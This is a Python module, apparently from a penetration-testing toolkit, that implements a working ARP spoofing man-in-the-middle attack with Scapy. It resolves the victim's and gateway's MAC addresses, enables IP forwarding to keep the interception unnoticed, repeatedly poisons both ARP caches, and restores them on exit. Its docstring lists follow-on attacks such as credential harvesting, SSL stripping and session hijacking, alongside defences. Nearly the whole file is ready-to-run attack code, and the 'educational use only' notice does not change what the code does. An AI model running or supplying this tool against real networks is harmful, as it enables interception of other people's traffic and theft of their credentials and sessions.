# topic: Network Attacks
# title: ARP Spoofer (MITM)
# priority: 1

"""
arp_spoofer.py - ARP Spoofing / Man-in-the-Middle Attack
=========================================================
Performs a bidirectional ARP spoofing attack to position this
machine as a Man-in-the-Middle (MITM) between a target host
and its gateway.

HOW ARP SPOOFING WORKS
-----------------------
ARP (Address Resolution Protocol) maps IP addresses to MAC
addresses on a local network segment. It has NO authentication -
any machine can send an ARP reply claiming to own any IP address,
and the receiving host will update its ARP cache without question.

This tool exploits that trust by continuously sending two fake
ARP replies:

  To the TARGET  : "The gateway IP is at MY MAC address"
  To the GATEWAY : "The target IP is at MY MAC address"

Both devices update their ARP caches with false mappings. From
that point, all traffic between them flows through this machine.

ATTACK CHAIN
-------------
ARP spoofing is the first step in several real attack chains:
  1. Credential harvesting  - capture plaintext credentials
  2. SSL stripping          - downgrade HTTPS to HTTP
  3. Session hijacking      - steal authenticated session cookies
  4. DNS poisoning          - intercept and modify DNS responses
  5. Traffic analysis       - monitor which services a target uses

DEFENCES
---------
  - Dynamic ARP Inspection (DAI) on managed switches
  - Static ARP entries for critical hosts
  - HTTPS + HSTS prevents SSL stripping
  - 802.1X port authentication
  - Network monitoring tools like arpwatch

IP FORWARDING
--------------
For traffic to actually flow through this machine (rather than
being dropped), IP forwarding must be enabled:

  Linux   : this module enables it automatically
  Windows : instructions printed at startup
  macOS   : sysctl -w net.inet.ip.forwarding=1

CLEAN RESTORATION
------------------
On exit, this module sends corrective ARP replies to both the
target and gateway, restoring their ARP caches to the correct
state. This is standard practice in professional penetration
testing - leave the network as you found it.

PLATFORM SUPPORT
-----------------
Windows 11 : requires Administrator + Npcap
Linux/Kali : requires root

EDUCATIONAL USE ONLY.
ARP spoofing without authorisation is illegal in most
jurisdictions. Only use on networks you own or in an isolated
lab environment.

Requirements:
    pip install scapy
    Windows: Npcap from https://npcap.com
"""

import logging
import os
import sys
import time
import threading
from typing import Optional

IS_WINDOWS = os.name == "nt"
IS_LINUX   = sys.platform.startswith("linux")
IS_MACOS   = sys.platform == "darwin"

try:
    from scapy.all import (
        ARP,
        Ether,
        srp,
        sendp,
        get_if_hwaddr,
        get_if_list,
        conf as scapy_conf,
    )
    scapy_conf.verb = 0
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
SPOOF_INTERVAL = 2      # Seconds between ARP spoof packets
RESTORE_COUNT  = 5      # Corrective ARP packets sent on restore
ARP_TIMEOUT    = 3      # Seconds to wait for ARP reply


# ---------------------------------------------------------------------------
# Privilege check
# ---------------------------------------------------------------------------

def check_privileges() -> bool:
    """
    Verify root/Administrator privileges for raw frame injection.
    """
    try:
        return os.getuid() == 0
    except AttributeError:
        try:
            import ctypes
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False


# ---------------------------------------------------------------------------
# IP forwarding
# ---------------------------------------------------------------------------

def get_ip_forwarding_state() -> Optional[bool]:
    """
    Read the current IP forwarding state.

    Returns True/False on Linux, None on Windows/macOS
    (we do not read forwarding state on those platforms).
    """
    if not IS_LINUX:
        return None
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "r") as fh:
            return fh.read().strip() == "1"
    except OSError:
        return False


def set_ip_forwarding(enabled: bool) -> None:
    """
    Enable or disable IPv4 packet forwarding.

    Linux  : writes to /proc/sys/net/ipv4/ip_forward
    Windows: prints manual instructions
    macOS  : uses sysctl

    IP forwarding must be ON for intercepted packets to continue
    flowing to their destination. Without it, the target loses
    internet connectivity which immediately alerts the user.

    Parameters
    ----------
    enabled : bool   True to enable, False to disable/restore.
    """
    if IS_WINDOWS:
        if enabled:
            print("\n  [!] Windows IP forwarding must be enabled manually.")
            print("  [*] Run in an elevated Command Prompt:")
            print("      netsh interface ipv4 set global forwarding=enabled")
            print("  [*] Or enable via Registry:")
            print("      HKLM\\SYSTEM\\CurrentControlSet\\Services")
            print("      \\Tcpip\\Parameters -> IPEnableRouter = 1")
            print("  [*] Re-run this module after enabling forwarding.\n")
        return

    if IS_MACOS:
        value = "1" if enabled else "0"
        os.system(f"sysctl -w net.inet.ip.forwarding={value}")
        return

    # Linux
    value = "1" if enabled else "0"
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as fh:
            fh.write(value)
        state = "enabled" if enabled else "disabled"
        logger.info("IP forwarding %s.", state)
    except OSError as exc:
        logger.debug("Could not set IP forwarding: %s", exc)


# ---------------------------------------------------------------------------
# MAC address resolution
# ---------------------------------------------------------------------------

def get_mac(ip: str, interface: str) -> Optional[str]:
    """
    Resolve the MAC address for an IP by sending an ARP request.

    Sends an Ethernet broadcast containing an ARP who-has request.
    The host that owns that IP responds with its MAC address.

    srp() operates at Layer 2 (Ethernet) - required for ARP since
    ARP frames have no IP header. sr() would fail here.

    Parameters
    ----------
    ip        : str   IPv4 address to resolve.
    interface : str   Network interface to send the ARP request on.

    Returns
    -------
    MAC address string, or None if host is unreachable.
    """
    arp_request = ARP(pdst=ip)
    broadcast   = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet  = broadcast / arp_request

    try:
        answered, _ = srp(
            arp_packet,
            timeout=ARP_TIMEOUT,
            iface=interface,
            verbose=False,
        )
        if answered:
            return answered[0][1].hwsrc
    except Exception as exc:
        logger.error("MAC resolution failed for %s: %s", ip, exc)

    return None


def get_own_mac(interface: str) -> str:
    """
    Return the MAC address of this machine's network interface.

    Parameters
    ----------
    interface : str   Network interface name.
    """
    return get_if_hwaddr(interface)


# ---------------------------------------------------------------------------
# ARP packet builders
# ---------------------------------------------------------------------------

def build_spoof_packet(
    target_ip: str,
    target_mac: str,
    spoof_ip: str,
) -> Ether:
    """
    Build a spoofed ARP reply packet.

    Tells target_mac that spoof_ip is at OUR MAC address.
    Scapy fills in our real MAC as hwsrc automatically.

    Parameters
    ----------
    target_ip  : str   IP of the host whose cache we are poisoning.
    target_mac : str   MAC of the host whose cache we are poisoning.
    spoof_ip   : str   The IP we are falsely claiming to own.
    """
    return Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
    )


def build_restore_packet(
    target_ip: str,
    target_mac: str,
    source_ip: str,
    source_mac: str,
) -> Ether:
    """
    Build a corrective ARP reply to restore a poisoned cache entry.

    Re-associates source_ip with its real MAC address source_mac.

    Parameters
    ----------
    target_ip  : str   IP of the host whose cache we are restoring.
    target_mac : str   MAC of the host whose cache we are restoring.
    source_ip  : str   The IP whose correct mapping we are restoring.
    source_mac : str   The correct MAC address for source_ip.
    """
    return Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )


# ---------------------------------------------------------------------------
# Live packet counter
# ---------------------------------------------------------------------------

class PacketCounter:
    """
    Thread-safe packet counter with live terminal display.

    Runs in a background daemon thread, refreshing the display
    every second showing packets sent, elapsed time, and rate.
    """

    def __init__(self) -> None:
        self._count  = 0
        self._lock   = threading.Lock()
        self._running = False
        self._thread  = None
        self._start   = time.time()

    def increment(self) -> None:
        with self._lock:
            self._count += 1

    def get_count(self) -> int:
        with self._lock:
            return self._count

    def start(self) -> None:
        self._running = True
        self._start   = time.time()
        self._thread  = threading.Thread(
            target=self._display_loop,
            daemon=True,
        )
        self._thread.start()

    def stop(self) -> None:
        self._running = False

    def _display_loop(self) -> None:
        while self._running:
            elapsed = time.time() - self._start
            count   = self.get_count()
            pps     = count / elapsed if elapsed > 0 else 0
            print(
                f"\r  [*] Packets spoofed: {count:>6}  |  "
                f"Elapsed: {int(elapsed):>5}s  |  "
                f"Rate: {pps:>5.1f} pkt/s  "
                "  (Ctrl+C to stop)",
                end="",
                flush=True,
            )
            time.sleep(1)


# ---------------------------------------------------------------------------
# Core spoof / restore logic
# ---------------------------------------------------------------------------

def restore_arp_tables(
    target_ip: str,
    target_mac: str,
    gateway_ip: str,
    gateway_mac: str,
    interface: str,
) -> None:
    """
    Send corrective ARP replies to both the target and gateway.

    Restores both ARP caches to their correct state. We send
    RESTORE_COUNT copies of each packet because ARP is unreliable -
    multiple copies ensures delivery even on a busy network.

    Parameters
    ----------
    target_ip / target_mac   : victim host identity
    gateway_ip / gateway_mac : gateway identity
    interface                : network interface to send on
    """
    print(f"\n\n  [*] Restoring ARP tables...")

    restore_target = build_restore_packet(
        target_ip, target_mac, gateway_ip, gateway_mac
    )
    restore_gateway = build_restore_packet(
        gateway_ip, gateway_mac, target_ip, target_mac
    )

    sendp(
        restore_target,
        iface=interface,
        count=RESTORE_COUNT,
        verbose=False,
    )
    sendp(
        restore_gateway,
        iface=interface,
        count=RESTORE_COUNT,
        verbose=False,
    )

    print("  [+] ARP tables restored.")
    logger.info(
        "ARP tables restored for %s and %s.",
        target_ip, gateway_ip,
    )


def run_spoof_loop(
    target_ip: str,
    target_mac: str,
    gateway_ip: str,
    gateway_mac: str,
    interface: str,
    counter: PacketCounter,
) -> None:
    """
    Continuously send spoofed ARP packets to maintain MITM position.

    ARP caches expire - typically after 60 seconds. We must keep
    re-poisoning both caches faster than they expire.
    SPOOF_INTERVAL of 2 seconds is well within that window.

    Two packets sent per iteration:
      1. To TARGET  : "The gateway is at my MAC"
      2. To GATEWAY : "The target is at my MAC"

    Both required for bidirectional interception.

    Parameters
    ----------
    target_ip / target_mac   : victim host
    gateway_ip / gateway_mac : network gateway
    interface                : interface to send packets on
    counter                  : PacketCounter for live display
    """
    spoof_target  = build_spoof_packet(
        target_ip,  target_mac,  gateway_ip
    )
    spoof_gateway = build_spoof_packet(
        gateway_ip, gateway_mac, target_ip
    )

    while True:
        sendp(spoof_target,  iface=interface, verbose=False)
        sendp(spoof_gateway, iface=interface, verbose=False)
        counter.increment()
        time.sleep(SPOOF_INTERVAL)


# ---------------------------------------------------------------------------
# Interface selection helper
# ---------------------------------------------------------------------------

def select_interface() -> Optional[str]:
    """
    List available interfaces and prompt the user to select one.

    On Windows interfaces appear as GUIDs - we display them
    numbered so the user can select by number.

    Returns
    -------
    Selected interface name, or None if cancelled.
    """
    try:
        interfaces = get_if_list()
    except Exception as exc:
        print(f"  [!] Could not list interfaces: {exc}")
        return None

    print("\n  Available interfaces:\n")
    for i, iface in enumerate(interfaces, start=1):
        print(f"    {i:>2}.  {iface}")
    print()

    raw = input(
        "  Select interface number (or type name directly): "
    ).strip()
    if raw == "0":
        return None

    if raw.isdigit():
        idx = int(raw) - 1
        if not (0 <= idx < len(interfaces)):
            print("  [!] Invalid selection.")
            return None
        return interfaces[idx]
    else:
        if raw not in interfaces:
            print(f"  [!] Interface '{raw}' not found.")
            return None
        return raw


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    """
    Collect target/gateway details, resolve MACs, and start the
    spoof loop.

    Flow:
      1. Privilege and Scapy check
      2. Windows IP forwarding instructions if needed
      3. Collect interface, target IP, gateway IP
      4. Resolve MAC addresses for both hosts
      5. Enable IP forwarding (Linux/macOS)
      6. Start live packet counter
      7. Run spoof loop until Ctrl+C
      8. Stop counter, restore ARP tables, restore forwarding
    """
    print("\n  ARP Spoofer - MITM Attack")
    print("  " + "-" * 25)
    print(f"  Platform : {sys.platform}")
    print("  [!] Requires Administrator (Windows) or root (Linux).")
    print("  [!] EDUCATIONAL USE ONLY.")
    print("  [!] Only use on networks you own or are authorised to test.")
    print("  [*] Enter 0 at any prompt to cancel.\n")

    if not SCAPY_AVAILABLE:
        print("  [!] Scapy is not installed: pip install scapy")
        if IS_WINDOWS:
            print("  [!] Also requires Npcap from https://npcap.com")
        return

    if not check_privileges():
        print("  [!] This module requires elevated privileges.")
        if IS_WINDOWS:
            print("  [*] Right-click your terminal and select "
                  "Run as Administrator.")
        else:
            print("  [*] Run with: sudo python arp_spoofer.py")
        return

    # Windows IP forwarding instructions
    if IS_WINDOWS:
        print("  [!] Windows IP forwarding notice:")
        print("      To intercept traffic (not just disrupt it),")
        print("      IP forwarding must be enabled in Windows.")
        print("      Run in an elevated Command Prompt:")
        print("      netsh interface ipv4 set global forwarding=enabled")
        print()
        input("  Press Enter to continue once forwarding is enabled...")
        print()

    # Interface selection
    interface = select_interface()
    if not interface:
        return

    # Verify interface by getting its MAC
    try:
        own_mac = get_own_mac(interface)
    except Exception:
        print(f"  [!] Could not get MAC for '{interface}'.")
        print("      Check the interface name and try again.")
        return

    print(f"  [+] Interface MAC: {own_mac}")

    # Target IP
    target_ip = input("\n  Target IP (victim host): ").strip()
    if not target_ip or target_ip == "0":
        return

    # Gateway IP
    gateway_ip = input("  Gateway IP (router): ").strip()
    if not gateway_ip or gateway_ip == "0":
        return

    # Resolve MACs
    print(f"\n  [*] Resolving MAC addresses...")

    target_mac = get_mac(target_ip, interface)
    if not target_mac:
        print(f"  [!] Could not resolve MAC for {target_ip}.")
        print("      Is the host online and on the same network segment?")
        return
    print(f"  [+] Target  {target_ip} -> {target_mac}")

    gateway_mac = get_mac(gateway_ip, interface)
    if not gateway_mac:
        print(f"  [!] Could not resolve MAC for {gateway_ip}.")
        print("      Is the gateway reachable?")
        return
    print(f"  [+] Gateway {gateway_ip} -> {gateway_mac}")

    # Confirm
    print(f"\n  Attack summary:")
    print(f"    Interface : {interface}")
    print(f"    Target    : {target_ip} ({target_mac})")
    print(f"    Gateway   : {gateway_ip} ({gateway_mac})")
    print(f"    Our MAC   : {own_mac}")
    print(f"\n  Both hosts will be told our MAC owns the other's IP.")
    print(f"  All traffic between them will flow through this machine.")

    confirm = input("\n  Start attack? (y/n): ").strip().lower()
    if confirm != "y":
        print("  Cancelled.")
        return

    # Enable IP forwarding
    original_forwarding = get_ip_forwarding_state()
    if IS_LINUX or IS_MACOS:
        set_ip_forwarding(True)
        print("  [+] IP forwarding enabled.")

    # Start counter
    counter = PacketCounter()
    counter.start()

    print(
        f"  [*] Spoofing started. "
        f"Sending packets every {SPOOF_INTERVAL}s.\n"
    )
    logger.info(
        "ARP spoof started: target=%s gateway=%s interface=%s",
        target_ip, gateway_ip, interface,
    )

    # Spoof loop
    try:
        run_spoof_loop(
            target_ip, target_mac,
            gateway_ip, gateway_mac,
            interface, counter,
        )
    except KeyboardInterrupt:
        pass

    # Clean up
    counter.stop()

    restore_arp_tables(
        target_ip, target_mac,
        gateway_ip, gateway_mac,
        interface,
    )

    # Restore IP forwarding
    if IS_LINUX or IS_MACOS:
        restore_state = (
            original_forwarding
            if original_forwarding is not None
            else False
        )
        set_ip_forwarding(restore_state)
        state_str = "enabled" if restore_state else "disabled"
        print(f"  [+] IP forwarding restored to {state_str}.")

    logger.info(
        "ARP spoof stopped. Packets sent: %d",
        counter.get_count(),
    )
    print("  [*] Attack stopped cleanly. Network left in original state.")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    main()